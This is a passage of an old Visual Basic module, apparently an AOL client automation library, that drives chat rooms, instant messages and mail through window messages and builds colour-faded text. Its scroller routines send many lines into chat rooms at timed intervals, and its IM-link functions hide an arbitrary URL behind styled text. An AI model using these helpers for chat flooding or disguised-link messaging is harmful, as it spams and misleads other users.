If UCase(GetCaption(firs%)) Like UCase(childhand) & "*" Then GoTo bone
Wend
FindByTitle = 0

bone:
Room% = firs%
FindByTitle = Room%
End Function

Function FindByClass(parentw, childhand)
firs% = GetWindow(parentw, 5)
If UCase(Mid(GetClass(firs%), 1, Len(childhand))) Like UCase(childhand) Then GoTo bone
firs% = GetWindow(parentw, GW_CHILD)
If UCase(Mid(GetClass(firs%), 1, Len(childhand))) Like UCase(childhand) Then GoTo bone

While firs%
firss% = GetWindow(parentw, 5)
If UCase(Mid(GetClass(firss%), 1, Len(childhand))) Like UCase(childhand) Then GoTo bone
firs% = GetWindow(firs%, 2)
If UCase(Mid(GetClass(firs%), 1, Len(childhand))) Like UCase(childhand) Then GoTo bone
Wend
FindByClass = 0

bone:
Room% = firs%
FindByClass = Room%

End Function

Function RandomNumber(finished)
Randomize
RandomNumber = Int((Val(finished) * Rnd) + 1)
End Function

Function AoL3_MdI()
AOL% = FindWindow("AOL Frame25", vbNullString)
AoL3_MdI = FindByClass(AOL%, "MDIClient")
End Function

Public Sub AoL3_Button(but%)
Clickit% = SendMessage(but%, WM_KEYDOWN, VK_SPACE, 0)
Clickit% = SendMessage(but%, WM_KEYUP, VK_SPACE, 0)
End Sub
    Function AoL4_OnlineTime()
AOL4_Keyword "clock"
'aol% = AOL4_mOdal()
Do
AOL% = FindIt(AOL%, "_AOL_Static")
AoL4_OnlineTime = GetAPIText(AOL%)
Loop Until AOL% <> 0
Do
Modal% = FindWindow("_AOL_Modal", vbNullString)
AOIcon% = FindIt(Modal%, "_AOL_Icon")
Call Click(AOIcon%)
Pause 0.00001
Loop Until Modal% = 0
End Function

Sub AoL3_ImsOff()
Call AoL3_ImSend("$IM_OFF", "Ims Are Off")
End Sub

Sub AoL3_ImsOn()
Call AoL3_ImSend("$IM_ON", "Ims Are on!")
End Sub

Sub AoL3_ChatSend(Txt)
Room% = AoL3_FindRoom()
Call AoL3_SetText(FindByClass(Room%, "_AOL_Edit"), Txt)
DoEvents
Call SendCharNum(FindByClass(Room%, "_AOL_Edit"), 13)
End Sub

Function AoL3_FindRoom()
AOL% = FindWindow("AOL Frame25", vbNullString)
MDI% = FindByClass(AOL%, "MDIClient")
firs% = GetWindow(MDI%, 5)
listers% = FindByClass(firs%, "_AOL_Edit")
listere% = FindByClass(firs%, "_AOL_View")
listerb% = FindByClass(firs%, "_AOL_Listbox")
If listers% And listere% And listerb% Then GoTo bone
firs% = GetWindow(MDI%, GW_CHILD)
While firs%
firs% = GetWindow(firs%, 2)
listers% = FindByClass(firs%, "_AOL_Edit")
listere% = FindByClass(firs%, "_AOL_View")
listerb% = FindByClass(firs%, "_AOL_Listbox")
If listers% And listere% And listerb% Then GoTo bone
AOL% = FindWindow("AOL Frame25", vbNullString)
MDI% = FindByClass(AOL%, "MDIClient")
firs% = GetWindow(MDI%, 5)
listers% = FindByClass(firs%, "_AOL_Edit")
listere% = FindByClass(firs%, "_AOL_View")
listerb% = FindByClass(firs%, "_AOL_Listbox")
If listers% And listere% And listerb% Then GoTo bone
Wend

bone:
Room% = firs%
AoL3_FindRoom = Room%
End Function

Function AoL3_ChatGet()
childs% = AoL3_FindRoom()
Child = FindByClass(childs%, "_AOL_View")

GetTrim = SenditbyNum(Child, 14, 0&, 0&)
TrimSpace$ = Space$(GetTrim)
getstring = SenditByString(Child, 13, GetTrim + 1, TrimSpace$)
theview$ = TrimSpace$
AoL3_ChatGet = theview$
End Function

Function AoL3_GetText(Child)
GetTrim = SenditbyNum(Child, 14, 0&, 0&)
TrimSpace$ = Space$(GetTrim)
getstring = SenditByString(Child, 13, GetTrim + 1, TrimSpace$)

AoL3_GetText = TrimSpace$
End Function

Sub AoL3_Icon(icon%)
ClickIn% = SendMessage(icon%, WM_LBUTTONDOWN, 0, 0&)
ClickIn% = SendMessage(icon%, WM_LBUTTONUP, 0, 0&)
End Sub

Sub AoL3_ImSend(Person, Message)
Call RunMenuByString(AoL3_Window(), "Send an Instant Message")

Do: DoEvents
AOL% = FindWindow("AOL Frame25", vbNullString)
MDI% = FindByClass(AOL%, "MDIClient")
IM% = FindByTitle(MDI%, "Send Instant Message")
AOLEdit% = FindByClass(IM%, "_AOL_Edit")
aolrich% = FindByClass(IM%, "RICHCNTL")
imsend% = FindByClass(IM%, "_AOL_Icon")
If AOLEdit% <> 0 And aolrich% <> 0 And imsend% <> 0 Then Exit Do
Loop

Call AoL3_SetText(AOLEdit%, Person)
Call AoL3_SetText(aolrich%, Message)
imsend% = FindByClass(IM%, "_AOL_Icon")

For sends = 1 To 9
imsend% = GetWindow(imsend%, 2)
Next sends
AoL3_Icon (imsend%)
Do: DoEvents
AOL% = FindWindow("AOL Frame25", vbNullString)
MDI% = FindByClass(AOL%, "MDIClient")
IM% = FindByTitle(MDI%, "Send Instant Message")
aolcl% = FindWindow("#32770", "America Online")
If aolcl% <> 0 Then closer = SendMessage(aolcl%, WM_CLOSE, 0, 0): closer2 = SendMessage(IM%, WM_CLOSE, 0, 0): Exit Do
If IM% = 0 Then Exit Do
Loop
End Sub
Sub AoL3_Keyword(text)
Call RunMenuByString(AoL3_Window(), "Keyword...")

Do: DoEvents
AOL% = FindWindow("AOL Frame25", vbNullString)
MDI% = FindByClass(AOL%, "MDIClient")
keyw% = FindByTitle(MDI%, "Keyword")
kedit% = FindByClass(keyw%, "_AOL_Edit")
If kedit% Then Exit Do
Loop
editsend% = SenditByString(kedit%, WM_SETTEXT, 0, text)
pausing = DoEvents()
sending% = SendMessage(kedit%, 258, 13, 0)
pausing = DoEvents()
End Sub

Function AoL3_LastChatLineWithSn()
getpar% = AoL3_FindRoom()
Child = FindByClass(getpar%, "_AOL_View")
GetTrim = SenditbyNum(Child, 14, 0&, 0&)
TrimSpace$ = Space$(GetTrim)
getstring = SenditByString(Child, 13, GetTrim + 1, TrimSpace$)
theview$ = TrimSpace$
For FindChar = 1 To Len(theview$)
TheChar$ = Mid(theview$, FindChar, 1)
TheChars$ = TheChars$ & TheChar$

If TheChar$ = Chr(13) Then
thechatext$ = Mid(TheChars$, 1, Len(TheChars$) - 1)
TheChars$ = ""
End If

Next FindChar
lastlen = Val(FindChar) - Len(TheChars$)
LastLine = Mid(theview$, lastlen + 1, Len(TheChars$) - 1)
AoL3_LastChatLineWithSn = LastLine
End Function

Sub AoL3_MailSend(Person, Subject, Message)
Call RunMenuByString(AoL3_Window(), "Compose Mail")

Do: DoEvents
AOL% = FindWindow("AOL Frame25", vbNullString)
MDI% = FindByClass(AOL%, "MDIClient")
MailWin% = FindByTitle(MDI%, "Compose Mail")
icone% = FindByClass(MailWin%, "_AOL_Icon")
Peepz% = FindByClass(MailWin%, "_AOL_Edit")
subjt% = FindByTitle(MailWin%, "Subject:")
subjec% = GetWindow(subjt%, 2)
mess% = FindByClass(MailWin%, "RICHCNTL")
If icone% <> 0 And Peepz% <> 0 And subjec% <> 0 And mess% <> 0 Then Exit Do
Loop
a = SenditByString(Peepz%, WM_SETTEXT, 0, Person)
a = SenditByString(subjec%, WM_SETTEXT, 0, Subject)
a = SenditByString(mess%, WM_SETTEXT, 0, Message)

AoL3_Icon (icone%)
Do: DoEvents
AOL% = FindWindow("AOL Frame25", vbNullString)
MDI% = FindByClass(AOL%, "MDIClient")
MailWin% = FindByTitle(MDI%, "Compose Mail")
erro% = FindByTitle(MDI%, "Error")
aolw% = FindWindow("_AOL_Modal", vbNullString)
If MailWin% = 0 Then Exit Do
If aolw% <> 0 Then
AoL3_Button (FindByTitle(aolw%, "OK"))
a = SendMessage(MailWin%, WM_CLOSE, 0, 0)
Exit Sub
End If
If erro% <> 0 Then
a = SendMessage(erro%, WM_CLOSE, 0, 0)
a = SendMessage(MailWin%, WM_CLOSE, 0, 0)
Exit Do
End If
Loop
End Sub
Sub AoL3_SetText(win, Txt)
TheText% = SenditByString(win, WM_SETTEXT, 0, Txt)
End Sub
Function AoL3_Window()
AOL% = FindWindow("AOL Frame25", vbNullString)
AoL3_Window = AOL%
End Function
Sub SendCharNum(win, chars)
e = SenditbyNum(win, WM_CHAR, chars, 0)

End Sub

Function SetChildFocus(Child)
setchild% = SetFocusAPI(Child)
End Function
Sub RunMenu(Menu1 As Integer, Menu2 As Integer)
Dim AOLWorks As Long
Static Working As Integer

AOLMenus% = GetMenu(FindWindow("AOL Frame25", vbNullString))
AOLSubmenu% = GetSubMenu(AOLMenus%, Menu1)
AOLItemID = GetMenuItemID(AOLSubmenu%, Menu2)
AOLWorks = CLng(0) * &H10000 Or Working
ClickAOLMenu = SenditbyNum(FindWindow("AOL Frame25", vbNullString), 273, AOLItemID, 0&)

End Sub
Sub RunMenuByString(Application, StringSearch)
ToSearch% = GetMenu(Application)
MenuCount% = GetMenuItemCount(ToSearch%)

For FindString = 0 To MenuCount% - 1
ToSearchSub% = GetSubMenu(ToSearch%, FindString)
MenuItemCount% = GetMenuItemCount(ToSearchSub%)

For getstring = 0 To MenuItemCount% - 1
SubCount% = GetMenuItemID(ToSearchSub%, getstring)
MenuString$ = String$(100, " ")
GetStringMenu% = GetMenuString(ToSearchSub%, SubCount%, MenuString$, 100, 1)

If InStr(UCase(MenuString$), UCase(StringSearch)) Then
MenuItem% = SubCount%
GoTo MatchString
End If

Next getstring

Next FindString
MatchString:
RunTheMenu% = SendMessage(Application, WM_COMMAND, MenuItem%, 0)
End Sub


Function AoL4_BlackGrey(Txt)
    a = Len(Txt)
    For b = 1 To a
        c = Left(Txt, b)
        D = Right(c, 1)
        e = 200 / a
        f = e * b
        G = RGB(f, f, f)
        h = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & h & ">" & D
    Next b
AoL4_ChatSend ("" + Msg + "")
End Function
Function AoL4_BlackLBlue_Black(Txt)
    a = Len(Txt)
    For b = 1 To a
        c = Left(Txt, b)
        D = Right(c, 1)
        e = 510 / a
        f = e * b
        If f > 255 Then f = (255 - (f - 255))
        G = RGB(f, f, f - f)
        h = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & h & ">" & D
    Next b
    AoL4_ChatSend ("<b>" + Msg + "")
End Function

Public Function LineCount(me1 As String) As Long
Dim haha As Long, Count As Long

If Len(me1$) < 1 Then
    LineCount& = 0&
    Exit Function
    End If
    haha& = InStr(me1$, Chr(13))
If haha& <> 0& Then
    LineCount& = 1
    Do
    haha& = InStr(haha + 1, me1$, Chr(13))
If haha& <> 0& Then
    LineCount& = LineCount& + 1
    End If
    Loop Until haha& = 0&
    End If
    LineCount& = LineCount& + 1
End Function

Public Function LineFromString(strin As String, strin2 As Long) As String
Dim Txt As String, Count As Long
Dim koo As Long, koo2 As Long, it As Long
Count& = LineCount(strin$)
If strin2& > Count& Then
        Exit Function
End If
If strin2& = 1 And Count& = 1 Then
LineFromString$ = strin$
        Exit Function
End If
If strin2& = 1 Then
Txt$ = Left(strin$, InStr(strin$, Chr(13)) - 1)
Txt$ = ReplaceString(Txt$, Chr(13), "")
Txt$ = ReplaceString(Txt$, Chr(10), "")
LineFromString$ = Txt$
        Exit Function
Else
koo& = InStr(strin$, Chr(13))
For it& = 1 To strin2& - 1
koo2& = koo&
koo& = InStr(koo& + 1, strin$, Chr(13))
Next it
If koo = 0 Then
koo = Len(strin$)
End If
Txt$ = Mid(strin$, koo2&, koo& - koo2& + 1)
Txt$ = ReplaceString(Txt$, Chr(13), "")
Txt$ = ReplaceString(Txt$, Chr(10), "")
LineFromString$ = Txt$
End If
End Function

Public Function ReplaceString(me1 As String, ToFind As String, ReplaceWith As String) As String
Dim haha As Long, Newhaha As Long, LeftString As String
Dim RightString As String, NewString As String
    haha& = InStr(LCase(me1$), LCase(ToFind))
    Newhaha& = haha&
Do
If Newhaha& > 0& Then
    LeftString$ = Left(me1$, Newhaha& - 1)
If haha& + Len(ToFind$) <= Len(me1$) Then
    RightString$ = Right(me1$, Len(me1$) - Newhaha& - Len(ToFind$) + 1)
    Else
    RightString = ""
    End If
    NewString$ = LeftString$ & ReplaceWith$ & RightString$
    me1$ = NewString$
    Else
    NewString$ = me1$
    End If
    haha& = Newhaha& + Len(ReplaceWith$)
If haha& > 0 Then
    Newhaha& = InStr(haha&, LCase(me1$), LCase(ToFind$))
    End If
    Loop Until Newhaha& < 1
    ReplaceString$ = NewString$
End Function

Public Function ReverseString(it As String) As String
Dim TempString As String, StringLength As Long
    Dim Count As Long, NextChr As String, NewString As String
TempString$ = it$
    StringLength& = Len(TempString$)
Do While Count& <= StringLength&
Count& = Count& + 1
NextChr$ = Mid$(TempString$, Count&, 1)
NewString$ = NextChr$ & NewString$
Loop
ReverseString$ = NewString$
End Function

Public Sub AoL4_ScrollTxtBox2(ScrollString As String)
Dim Curntline As String, Count As Long, Send2Chat As Long
Dim TextBox As Long
If FindRoom& = 0 Then Exit Sub
If ScrollString$ = "" Then Exit Sub
Count& = LineCount(ScrollString$)
TextBox& = 1
For Send2Chat& = 1 To Count&
Curntline$ = LineFromString(ScrollString$, Send2Chat&)
If Len(Curntline$) > 0 Then
If Len(Curntline$) > 92 Then
Curntline$ = Left(Curntline$, 92)
End If
AoL4_ChatSend (Curntline$)
TimeOut 0.5
End If
TextBox& = TextBox& + 1
If TextBox& > 0 Then
TextBox& = 1
TimeOut 0.5
End If
Next Send2Chat&
End Sub

Function AoL4_RoomCount()
Dim Chat%
Chat% = AoL4_FindChatRoom()
List% = FindIt(Chat%, "_AOL_Listbox")
Count% = SendMessage(List%, LB_GETCOUNT, 0, 0)
AoL4_RoomCount = Count%
If AoL4_RoomCount = "1" Then
AoL4_RoomCount = "one"
End If
If AoL4_RoomCount = "2" Then
AoL4_RoomCount = "two"
End If
If AoL4_RoomCount = "3" Then
AoL4_RoomCount = "three"
End If
If AoL4_RoomCount = "4" Then
AoL4_RoomCount = "four"
End If
If AoL4_RoomCount = "5" Then
AoL4_RoomCount = "five"
End If
If AoL4_RoomCount = "6" Then
AoL4_RoomCount = "six"
End If
If AoL4_RoomCount = "7" Then
AoL4_RoomCount = "seven"
End If
If AoL4_RoomCount = "8" Then
AoL4_RoomCount = "eight"
End If
If AoL4_RoomCount = "9" Then
AoL4_RoomCount = "nine"
End If
If AoL4_RoomCount = "10" Then
AoL4_RoomCount = "ten"
End If
If AoL4_RoomCount = "11" Then
AoL4_RoomCount = "eleven"
End If
If AoL4_RoomCount = "12" Then
AoL4_RoomCount = "twelve"
End If
If AoL4_RoomCount = "13" Then
AoL4_RoomCount = "thirteen"
End If
If AoL4_RoomCount = "14" Then
AoL4_RoomCount = "fourteen"
End If
If AoL4_RoomCount = "15" Then
AoL4_RoomCount = "fifteen"
End If
If AoL4_RoomCount = "16" Then
AoL4_RoomCount = "sixteen"
End If
If AoL4_RoomCount = "17" Then
AoL4_RoomCount = "seventeen"
End If
If AoL4_RoomCount = "18" Then
AoL4_RoomCount = "eighteen"
End If
If AoL4_RoomCount = "19" Then
AoL4_RoomCount = "nineteen"
End If
If AoL4_RoomCount = "20" Then
AoL4_RoomCount = "twenty"
End If
If AoL4_RoomCount = "21" Then
AoL4_RoomCount = "twenty one"
End If
If AoL4_RoomCount = "22" Then
AoL4_RoomCount = "twenty two"
End If
If AoL4_RoomCount = "23" Then
AoL4_RoomCount = "twenty three"
End If
If AoL4_RoomCount = "24" Then
AoL4_RoomCount = "twenty four"
End If
If AoL4_RoomCount = "25" Then
AoL4_RoomCount = "twenty five"
End If
If AoL4_RoomCount = "26" Then
AoL4_RoomCount = "twenty six"
End If
If AoL4_RoomCount = "27" Then
AoL4_RoomCount = "twenty seven"
End If
If AoL4_RoomCount = "28" Then
AoL4_RoomCount = "twenty eight"
End If
If AoL4_RoomCount = "29" Then
AoL4_RoomCount = "twenty nine"
End If
If AoL4_RoomCount = "30" Then
AoL4_RoomCount = "thirty"
End If
If AoL4_RoomCount = "31" Then
AoL4_RoomCount = "thirty one"
End If
If AoL4_RoomCount = "32" Then
AoL4_RoomCount = "thirty two"
End If
If AoL4_RoomCount = "33" Then
AoL4_RoomCount = "thirty three"
End If
If AoL4_RoomCount = "34" Then
AoL4_RoomCount = "thirty four"
End If
If AoL4_RoomCount = "35" Then
AoL4_RoomCount = "thirty five"
End If
If AoL4_RoomCount = "36" Then
AoL4_RoomCount = "thirty six"
End If
If AoL4_RoomCount = "37" Then
AoL4_RoomCount = "thirty seven"
End If
If AoL4_RoomCount = "38" Then
AoL4_RoomCount = "thirty eight"
End If
If AoL4_RoomCount = "39" Then
AoL4_RoomCount = "thirty nine"
End If
If AoL4_RoomCount = "40" Then
AoL4_RoomCount = "fourty"
End If
If AoL4_RoomCount = "41" Then
AoL4_RoomCount = "fourty one"
End If
If AoL4_RoomCount = "42" Then
AoL4_RoomCount = "fourty two"
End If
If AoL4_RoomCount = "43" Then
AoL4_RoomCount = "fourty three"
End If
If AoL4_RoomCount = "44" Then
AoL4_RoomCount = "fourty four"
End If
If AoL4_RoomCount = "45" Then
AoL4_RoomCount = "fourty five"
End If
If AoL4_RoomCount = "46" Then
AoL4_RoomCount = "fourty six"
End If
If AoL4_RoomCount = "47" Then
AoL4_RoomCount = "fourty seven"
End If
If AoL4_RoomCount = "48" Then
AoL4_RoomCount = "fourty eight"
End If
If AoL4_RoomCount = "49" Then
AoL4_RoomCount = "fourty nine"
End If
If AoL4_RoomCount = "50" Then
AoL4_RoomCount = "fifty"
End If
End Function

Public Sub AoL3_ScrolltxTBox2(ScrollString As String)                                                                           '===============================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================BLiZzaRD.bas by TRiPP Email:thismightbetripp@aol.com

Dim Curntline As String, Count As Long, Send2Chat As Long
Dim TextBox As Long
If FindRoom& = 0 Then Exit Sub
If ScrollString$ = "" Then Exit Sub
Count& = LineCount(ScrollString$)
TextBox& = 1
For Send2Chat& = 1 To Count&
Curntline$ = LineFromString(ScrollString$, Send2Chat&)
If Len(Curntline$) > 0 Then
If Len(Curntline$) > 92 Then
Curntline$ = Left(Curntline$, 92)
End If
AoL3_ChatSend (Curntline$)
TimeOut 0.5
End If
TextBox& = TextBox& + 1
If TextBox& > 0 Then
TextBox& = 1
TimeOut 0.5
End If
Next Send2Chat&
End Sub
Public Sub AiM_ScrolltxTBox2(ScrollString As String)
Dim Curntline As String, Count As Long, Send2Chat As Long
Dim TextBox As Long
If FindRoom& = 0 Then Exit Sub
If ScrollString$ = "" Then Exit Sub
Count& = LineCount(ScrollString$)
TextBox& = 1
For Send2Chat& = 1 To Count&
Curntline$ = LineFromString(ScrollString$, Send2Chat&)
If Len(Curntline$) > 0 Then
If Len(Curntline$) > 92 Then
Curntline$ = Left(Curntline$, 92)
End If
AiM_ChatSend (Curntline$)
TimeOut 0.5
End If
TextBox& = TextBox& + 1
If TextBox& > 0 Then
TextBox& = 1
TimeOut 0.5
End If
Next Send2Chat&
End Sub

Function AoL4_BlackLBlue(Txt)
    a = Len(Txt)
    For b = 1 To a
        c = Left(Txt, b)
        D = Right(c, 1)
        e = 255 / a
        f = e * b
        G = RGB(f, f, f - f)
        h = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & h & ">" & D & "<b>"
    Next b
    AoL4_ChatSend ("" + Msg + "")
End Function
Function AoL4_LBlueGreenLBlue(Txt)
    a = Len(Txt)
    For b = 1 To a
        c = Left(Txt, b)
        D = Right(c, 1)
        e = 510 / a
        f = e * b
        If f > 255 Then f = (255 - (f - 255))
        G = RGB(255 - f, 255, 0)
        h = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & h & ">" & D
    Next b
    AoL4_ChatSend ("" + Msg + "")
End Function
Function AoL4_LBlueYellowLBlue(Txt)
    a = Len(Txt)
    For b = 1 To a
        c = Left(Txt, b)
        D = Right(c, 1)
        e = 510 / a
        f = e * b
        If f > 255 Then f = (255 - (f - 255))
        G = RGB(255 - f, 255, f)
        h = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & h & ">" & D
    Next b
AoL4_ChatSend ("" + Msg + "")
End Function
Function AoL4_PurpleLBluePurple(Txt)
    a = Len(Txt)
    For b = 1 To a
        c = Left(Txt, b)
        D = Right(c, 1)
        e = 510 / a
        f = e * b
        If f > 255 Then f = (255 - (f - 255))
      G = RGB(255, f, 255 - f)
        h = RGBtoHEX(G)
        Msg = Msg & "<b><Font Color=#" & h & "><b>" & D & "<b>"
    Next b
 AoL4_ChatSend ("" + Msg + "")
End Function

Function AoL4_DBlueBlackDBlue(Txt)
    a = Len(Txt)
    For b = 1 To a
        c = Left(Txt, b)
        D = Right(c, 1)
        e = 450 / a
        f = e * b
        If f > 255 Then f = (255 - (f - 255))
        G = RGB(255 - f, 0, 0)
        h = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & h & ">" & D
    Next b
AoL4_ChatSend ("" + Msg + "")
End Function

Function AoL4_DGreenBlack(Txt)
    a = Len(Txt)
    For b = 1 To a
        c = Left(Txt, b)
        D = Right(c, 1)
        e = 255 / a
        f = e * b
        G = RGB(0, f - f, 0)
        h = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & h & ">" & D
    Next b
AoL4_ChatSend ("" + Msg + "")
End Function
Function AoL4_LBlueOrange(Txt)
    a = Len(Txt)
    For b = 1 To a
        c = Left(Txt, b)
        D = Right(c, 1)
        e = 255 / a
        f = e * b
        G = RGB(255 - f, 155, f)
        h = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & h & ">" & D
    Next b
AoL4_ChatSend ("" + Msg + "")
End Function
Function AoL4_LBlueOrange_LBlue(Txt)
    a = Len(Txt)
    For b = 1 To a
        c = Left(Txt, b)
        D = Right(c, 1)
        e = 510 / a
        f = e * b
        If f > 255 Then f = (255 - (f - 255))
        G = RGB(255 - f, 155, f)
        h = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & h & ">" & D
    Next b
    AoL4_ChatSend ("" + Msg + "")
End Function
Function AoL4_LGreenDGreen(Txt)
    a = Len(Txt)
    For b = 1 To a
        c = Left(Txt, b)
        D = Right(c, 1)
        e = 220 / a
        f = e * b
        G = RGB(0, 375 - f, 0)
        h = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & h & ">" & D
    Next b
    AoL4_ChatSend ("" + Msg + "")
End Function
Function AoL4_LGreenDGreenLGreen(Txt)
    a = Len(Txt)
    For b = 1 To a
        c = Left(Txt, b)
        D = Right(c, 1)
        e = 490 / a
        f = e * b
        If f > 255 Then f = (255 - (f - 255))
        G = RGB(0, 375 - f, 0)
        h = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & h & ">" & D
    Next b
AoL4_ChatSend ("" + Msg + "")
End Function
Function AoL4_LBlueDBlue(Txt)
    a = Len(Txt)
    For b = 1 To a
        c = Left(Txt, b)
        D = Right(c, 1)
        e = 255 / a
        f = e * b
        G = RGB(355, 255 - f, 55)
        h = RGBtoHEX(G)
        Msg = Msg & "<b><Font Color=#" & h & ">" & D & "<b>"
    Next b
AoL4_ChatSend ("" + Msg + "")
End Function
Function AoL4_LBlueDBlueLBlue(Txt)
    a = Len(Txt)
    For b = 1 To a
        c = Left(Txt, b)
        D = Right(c, 1)
        e = 510 / a
        f = e * b
        If f > 255 Then f = (255 - (f - 255))
        G = RGB(355, 255 - f, 55)
        h = RGBtoHEX(G)
        Msg = Msg & "<b><Font Color=#" & h & ">" & D & "<b>"
    Next b
    AoL4_ChatSend ("" + Msg + "")
End Function
Function AoL4_PinkOrange(Txt)
    a = Len(Txt)
    For b = 1 To a
        c = Left(Txt, b)
        D = Right(c, 1)
        e = 200 / a
        f = e * b
        G = RGB(255 - f, 167, 510)
        h = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & h & ">" & D
    Next b
AoL4_ChatSend ("" + Msg + "")
End Function

Function AoL4_PinkOrangePink(Txt)
    a = Len(Txt)
    For b = 1 To a
        c = Left(Txt, b)
        D = Right(c, 1)
        e = 490 / a
        f = e * b
        If f > 255 Then f = (255 - (f - 255))
        G = RGB(255 - f, 167, 510)
        h = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & h & ">" & D
    Next b
  AoL4_ChatSend ("" + Msg + "")
End Function
Function AoL4_PurpleWhite(Txt)
    a = Len(Txt)
    For b = 1 To a
        c = Left(Txt, b)
        D = Right(c, 1)
        e = 200 / a
        f = e * b
        G = RGB(255, f, 255)
        h = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & h & ">" & D
    Next b
  AoL4_ChatSend ("" + Msg + "")
End Function
Function AoL4_PurpleWhitePurple(Txt)
    a = Len(Txt)
    For b = 1 To a
        c = Left(Txt, b)
        D = Right(c, 1)
        e = 510 / a
        f = e * b
        If f > 255 Then f = (255 - (f - 255))
        G = RGB(255, f, 255)
        h = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & h & ">" & D
    Next b
  AoL4_ChatSend ("" + Msg + "")
End Function
Function AoL4_YellowBlueYellow(Txt)
    a = Len(Txt)
    For b = 1 To a
        c = Left(Txt, b)
        D = Right(c, 1)
        e = 510 / a
        f = e * b
        If f > 255 Then f = (255 - (f - 255))
        G = RGB(f, 255, 255 - f)
        h = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & h & ">" & D
    Next b
  AoL4_ChatSend ("" + Msg + "")
End Function

Function AoL4_ImUlineLinkBoldBlackBlue(wh0, URL, Txt)
a = Len(Txt)
    For b = 1 To a
        c = Left(Txt, b)
        D = Right(c, 1)
        e = 255 / a
        f = e * b
        G = RGB(f, 0, 0)
        h = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & h & ">" & D
    Next b
      AoL4_ImSend (wh0), ("< A href=""" & URL & """ ><b>" + Msg + "</a>")
End Function
Function AoL4_ImUlineLinkBlackBlue(wh0, URL, Txt)
a = Len(Txt)
    For b = 1 To a
        c = Left(Txt, b)
        D = Right(c, 1)
        e = 255 / a
        f = e * b
        G = RGB(f, 0, 0)
        h = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & h & ">" & D
    Next b
      AoL4_ImSend (wh0), ("< A href=""" & URL & """ >" + Msg + "</a>")
End Function
Function AoL4_ImUlineLinkBlackBlueBlack(wh0, URL, Txt)
a = Len(Txt)
    For b = 1 To a
        c = Left(Txt, b)
        D = Right(c, 1)
        e = 510 / a
        f = e * b
        If f > 255 Then f = (255 - (f - 255))
        G = RGB(f, 0, 0)
        h = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & h & ">" & D
    Next b
      AoL4_ImSend (wh0), ("< A href=""" & URL & """ >" + Msg + "</a>")
End Function
Function AoL4_ImUlineLinkBlackGreen(wh0, URL, Txt)
a = Len(Txt)
    For b = 1 To a
        c = Left(Txt, b)
        D = Right(c, 1)
        e = 255 / a
        f = e * b
        G = RGB(0, f, 0)
        h = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & h & ">" & D
    Next b
     AoL4_ImSend (wh0), ("< A href=""" & URL & """ >" + Msg + "</a>")
End Function
Function AoL4_ImUlineLinkBlackGreenBlack(wh0, URL, Txt)
a = Len(Txt)
    For b = 1 To a
        c = Left(Txt, b)
        D = Right(c, 1)
        e = 510 / a
        f = e * b
        If f > 255 Then f = (255 - (f - 255))
        G = RGB(0, f, 0)
        h = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & h & ">" & D
    Next b
       AoL4_ImSend (wh0), ("< A href=""" & URL & """ >" + Msg + "</a>")
End Function
Function AoL4_ImUlineLinkBlackGrey(wh0, URL, Txt)
a = Len(Txt)
    For b = 1 To a
        c = Left(Txt, b)
        D = Right(c, 1)
        e = 220 / a
        f = e * b
        G = RGB(f, f, f)
        h = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & h & ">" & D
    Next b
    AoL4_ImSend (wh0), ("< A href=""" & URL & """ >" + Msg + "</a>")
End Function
Function AoL4_ImUlineLinkBlackGreyBlack(wh0, URL, Txt)
a = Len(Txt)
    For b = 1 To a
        c = Left(Txt, b)
        D = Right(c, 1)
        e = 490 / a
        f = e * b
        If f > 255 Then f = (255 - (f - 255))
        G = RGB(f, f, f)
        h = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & h & ">" & D
    Next b
       AoL4_ImSend (wh0), ("< A href=""" & URL & """ >" + Msg + "</a>")
End Function
Function AoL4_ImUlineLinkBlackPurple(wh0, URL, Txt)
a = Len(Txt)
    For b = 1 To a
        c = Left(Txt, b)
        D = Right(c, 1)
        e = 255 / a
        f = e * b
        G = RGB(f, 0, f)
        h = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & h & ">" & D
    Next b
       AoL4_ImSend (wh0), ("< A href=""" & URL & """ >" + Msg + "</a>")
End Function
Function AoL4_ImUlineLinkBlackPurpleBlack(wh0, URL, Txt)
a = Len(Txt)
    For b = 1 To a
        c = Left(Txt, b)
        D = Right(c, 1)
        e = 510 / a
        f = e * b
        If f > 255 Then f = (255 - (f - 255))
        G = RGB(f, 0, f)
        h = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & h & ">" & D
    Next b
    AoL4_ImSend (wh0), ("< A href=""" & URL & """ >" + Msg + "</a>")
End Function
Function AoL4_ImUlineLinkBlackRed(wh0, URL, Txt)
a = Len(Txt)
    For b = 1 To a
        c = Left(Txt, b)
        D = Right(c, 1)
        e = 255 / a
        f = e * b
        G = RGB(0, 0, f)
        h = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & h & ">" & D
    Next b
     AoL4_ImSend (wh0), ("< A href=""" & URL & """ >" + Msg + "</a>")
End Function
Function AoL4_ImUlineLinkBlackedRedBlack(wh0, URL, Txt)
a = Len(Txt)
    For b = 1 To a
        c = Left(Txt, b)
        D = Right(c, 1)
        e = 510 / a
        f = e * b
        If f > 255 Then f = (255 - (f - 255))
        G = RGB(0, 0, f)
        h = RGBtoHEX(G)
